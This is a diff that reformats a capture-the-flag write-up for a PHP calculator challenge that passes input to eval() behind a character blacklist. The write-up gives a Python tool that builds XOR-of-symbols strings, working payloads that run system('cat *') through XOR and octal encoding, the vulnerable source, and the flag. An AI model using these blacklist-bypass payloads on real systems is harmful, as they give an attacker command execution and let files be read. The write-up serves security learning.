@@ -1,37 +1,38 @@
 # Most Secure Calculation 2
 
-A version 2 calculation web page
+*The version 2 calculator web app*
 
 ## Step 1, enumeration:
-Inspec source-code, we get the html comment:
-
-	Hi Selina, 
-	I learned about regex today. I have upgraded the previous calculator. Now its the most secure calculator ever.
-	The calculator accepts only numbers and symbols. 
-	I have hidden some interesting things in flag.txt and I know you can create an interesting equation to read that file.
-
-Not Allowed Characters: all characters, $, <, >, =
+Viewing the source-code, we found a comment:
+```html
+Hi Selina, 
+I learned about regex today. I have upgraded the previous calculator. Now its the most secure calculator ever.
+The calculator accepts only numbers and symbols. 
+I have hidden some interesting things in flag.txt and I know you can create an interesting equation to read that file.
+```
+Do enumeration again equation parameter, we know that this challenge:
+**Blacklist characters**: all characters, $, <, >, =
 
 ## Step 2, exploit:
-Ok, inject some symbols we get some error and know eval() is using: 
+Ok, try to inject some special characters we get some error and know `eval()` function is using: 
 ```html
 Result : Parse error: syntax error, unexpected ';' in /var/www/html/index.php(12) : eval()'d code on line 1
 ```
 
-With blacklist characters it sound just like XOR. Ok, i don't finished this challenge, i stick with XOR but it doesn't work and then i relize we can XOR: string ^ string = string, not just 2 single character together. Ok, ye, ye leave me alone!!
+With blacklist characters this sound just like XOR string to bypass. Ok, i don't finished this challenge, i stick with XOR but it doesn't work and then i realize we can XOR: string ^ string = string, and not just 2 single character together. Ok, ye, ye leave me alone!!
 
-About XOR algorithm: XOR is OR operation, (1 ^ 1 = 0 ; 0 ^ 0 = 0), (1 ^ 0 = 1), example:
+**XOR string**:
+**About XOR algorithm**: XOR is OR operation, (1 ^ 1 = 0 ; 0 ^ 0 = 0), (1 ^ 0 = 1), example:
+```
+a: 01100001
+   ^(XOR)
+b: 01100010
+   -------
+3: 00000011
+```
+When we XOR two string, characters will sequence XOR each other(abcd^abcd), but when one longer than the other, this will be: ab ^ abababa
 
-	'a' ^ 'b' = 3
-	01100001
-	^
-	01100010
-	--------
-	00000011
-
-When we XOR two string, characters will sequence XOR each other(abcd^abcd), but when one longer than the other: ab ^ abababa
-
-`tool`: generate_xor.py
+**tool**: using `generate_xor.py` to convert characters to symbols.
 ```python
 # bad_girls = $, any characters(\n), <, >, =
 valid = r"0123456789!\"#%&'()*+,-./:;?@[]^_{}~`\\|"
@@ -56,9 +57,9 @@ for p in payload:
 			break
 
 print(f"('{one}'^'{two}')")
-
 ```
-**payload**: 
+
+**final payload**: after craft
 ```php
 system(cat *) : ('393480'^'@@@@]]')(('8!4'^'[@@').' *')
 ```
@@ -69,17 +70,12 @@ More easy way, with *double quote*, we can using hex, octal encoding to bypass t
 Ok, let's use octal(number from 0 to 7, which is allowed) encoding.
 
 **Reference**:
-String literal in python: https://stackoverflow.com/questions/50580002/what-does-a-backslash-mean-in-a-string-literal
+String literal in python: `https://stackoverflow.com/questions/50580002/what-does-a-backslash-mean-in-a-string-literal`: Using back slash to specify denote special type of string literals.
+
+About `hexdecimal`, notice *hex identifier*: `https://learn.sparkfun.com/tutorials/hexadecimal/`
+**Identifier**: 0x47DE, #FF7734, %20,\x0A, &#x	
 	
-	Using back slash to specify denote special type of string literals.
-
-About hexdecimal, notice *hex identifier*: https://learn.sparkfun.com/tutorials/hexadecimal/
-
-	Identifier: 0x47DE, #FF7734, %20,\x0A, &#x	
-	
-About octal prefix:
-
-	077, 0o77, \077
+**About octal prefix**: `077, 0o77, \077`
 
 **payload**:
 ```php
@@ -87,7 +83,7 @@ system('cat *') : ("\163\171\163\164\145\155")("\143\141\164 *")
 `cat *` : `\143\141\164 *`
 ```
 
-`source-code`: index.php
+**source-code**: `index.php`
 ```php
 <?php
 if (isset($_POST["equation"]) && !is_array($_POST["equation"])) {
@@ -107,4 +103,4 @@ if (isset($_POST["equation"]) && !is_array($_POST["equation"])) {
 }
 
 ```
-**flag**: KCTF{sHoUlD_I_uSe_eVaL_lIkE_tHaT}
+**flag**: `KCTF{sHoUlD_I_uSe_eVaL_lIkE_tHaT}`
